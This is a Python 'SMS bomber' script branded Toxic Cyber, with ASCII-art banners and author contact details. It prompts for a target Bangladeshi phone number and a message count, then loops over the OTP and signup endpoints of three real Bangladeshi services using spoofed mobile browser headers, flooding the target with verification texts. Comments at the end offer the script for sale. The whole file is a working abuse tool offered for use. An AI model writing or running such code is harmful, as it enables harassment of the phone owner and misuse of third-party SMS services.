import os, requests, time

time.sleep(1)
os.system("clear")
os.system("xdg-open https://www.facebook.com/msrtanim.py")
logo3 = ("""
\033[32;1m((𝐓𝐎𝐎𝐋 𝐔𝐏𝐃𝐀𝐓𝐄 SUCCESSFUL))
\033[32;1m((𝐓𝐎𝐗𝐈𝐂 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂𝐔𝐑𝐈𝐓𝐘))
\033[32;1m((𝐓𝐎𝐗𝐈𝐂_𝐂𝐘𝐁𝐄𝐑_𝐒𝐌𝐒_𝐁𝐎𝐌𝐁𝐄𝐑_))
\033[32;1m((𝐖𝐄𝐋𝐋𝐂𝐎𝐌𝐄_𝐓𝐎_𝐓𝐎𝐗𝐈𝐂_𝐂𝐘𝐁𝐄𝐑_𝐁𝐎𝐌𝐁𝐄𝐑))


\033[32;1m####### \033[37;1m######### \033[33;1m#     # \033[34;1m### \033[31;1m #####  
\033[32;1m   #    \033[37;1m##     ## \033[33;1m #   #  \033[34;1m #  \033[31;1m#     # 
\033[32;1m   #    \033[37;1m##     ## \033[33;1m  # #   \033[34;1m #  \033[31;1m#       
\033[32;1m   #    \033[37;1m##     ## \033[33;1m   #    \033[34;1m #  \033[31;1m#       
\033[32;1m   #    \033[37;1m##     ## \033[33;1m  # #   \033[34;1m #  \033[31;1m#       
\033[32;1m   #    \033[37;1m##     ## \033[33;1m #   #  \033[34;1m #  \033[31;1m#     # 
\033[32;1m   #    \033[37;1m######### \033[33;1m#     # \033[34;1m### \033[31;1m #####  
  ______   ____    ____   ______   
.' ____ \ |_   \  /   _|.' ____ \  
| (___ \_|  |   \/   |  | (___ \_| 
 _.____`.   | |\  /| |   _.____`.  
| \____) | _| |_\/_| |_ | \____) | 
 \______.'|_____||_____| \______.' 
                                   
 ______      ___   ____    ____  ______   ________  _______     
|_   _ \   .'   `.|_   \  /   _||_   _ \ |_   __  ||_   __ \    
  | |_) | /  .-.  \ |   \/   |    | |_) |  | |_ \_|  | |__) |   
  |  __'. | |   | | | |\  /| |    |  __'.  |  _| _   |  __ /    
 _| |__) |\  `-'  /_| |_\/_| |_  _| |__) |_| |__/ | _| |  \ \_  
|_______/  `.___.'|_____||_____||_______/|________||____| |___| 
                                                                                                            
\033[32;1m┌──────────────────────────────────────────┐
\033[32;1m│ [✓] AUTHOR   : 𝐌𝐃 𝐒𝐀𝐌𝐈𝐔𝐑 𝐑𝐀𝐇𝐌𝐀𝐍 𝐓𝐀𝐍𝐈𝐌    │
\033[33;1m│ [✓] GITHUB   : 𝐌𝐒𝐑𝐓𝐚𝐧𝐢𝐦                  │
\033[34;1m│ [✓] WHATSAPP : +𝟖𝟖𝟎𝟏𝟓𝟕𝟓𝟏𝟐𝟎𝟔𝟖𝟐            │
\033[35;1m│ [✓] VERSION  : 0.1                       │
\033[36;1m│ [✓] POWER BY : \033[1;32m𝐓𝐎𝐗𝐈𝐂 𝐂𝐘𝐁𝐄𝐑 \033[1;37m              │
\033[37;1m└──────────────────────────────────────────┘
""")
print(logo3)
num = input("""  \033[1;32m𝐄𝐍𝐓𝐄𝐑 𝐓𝐀𝐑𝐆𝐄𝐓 𝐍𝐔𝐌𝐁𝐄𝐑 : +880""")
amount = int(input("\n  \033[1;32mSMS AMOUNT : "))
headers1 = {
  "authority": "www.bioscopelive.com",
  "method": "GET",
  "scheme": "https",
  "accept": "*/*",
  "accept-encoding": "gzip, deflate, br",
  "accept-language": "en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
  "if-none-match": 'W/"5baf0d010507bc980255f9941283860a"',
  "referer": "https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
  "save-data": "on",
  "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
  "sec-ch-ua-mobile": "?1",
  "sec-ch-ua-platform": 'Android',
  "sec-fetch-dest": "empty",
  "sec-fetch-mode": "cors",
  "sec-fetch-site": "same-origin",
  "user-agent":
  "Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
  "x-requested-with": "XMLHttpRequest"
}
url1 = "https://www.bioscopelive.com/en/login/send-otp?phone=880" + num + "&operator=bd-otp"
headers2 = {
  "referer":
  "https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
  "user-agent":
  "Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
url2 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0" + num
data = {"name": num, "phoneNumber": num, "service": "redx"}
headers3 = {
  "referer":
  "https://redx.com.bd/",
  "user-agent":
  "Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
ses = 0
while amount > ses:
  sent1 = requests.get(url1, headers=headers1)
  if sent1.status_code == 200:
    ses += 1
    print(f"\n{ses} \033[1;32m𝐒𝐌𝐒 𝐒𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘")
  else:
    pass

  sent2 = requests.get(url2, headers=headers2)
  if sent2.status_code == 200:
    ses += 1
    print(f"\n{ses} \033[1;32m𝐒𝐌𝐒 𝐒𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘")
  else:
    pass

  send3 = requests.post("https://api.redx.com.bd/v1/user/signup",
                        headers=headers3,
                        data=data)
  if send3.status_code == 200:
    ses += 1
    print(f"\n{ses} \033[1;32m𝐒𝐌𝐒 𝐒𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘")

  else:
    pass
os.system("clear")
print(""" \033[1;32m
      ____  ____  _  ________
     / __ \/ __ \/ | / / ____/
    / / / / / / /  |/ / __/   
   / /_/ / /_/ / /|  / /___   
  /_____/\____/_/ |_/_____/   
                            
 TNQ FOR USING OUR TOOLS 🖤
""")

#MUSLIM_CYBER_SECURITY_NOT ALLOW
#BOLOD SCRIPT CHOR🙂
#INBOX KORE TAKA DIYE SCRIPT KINE NIYE JA
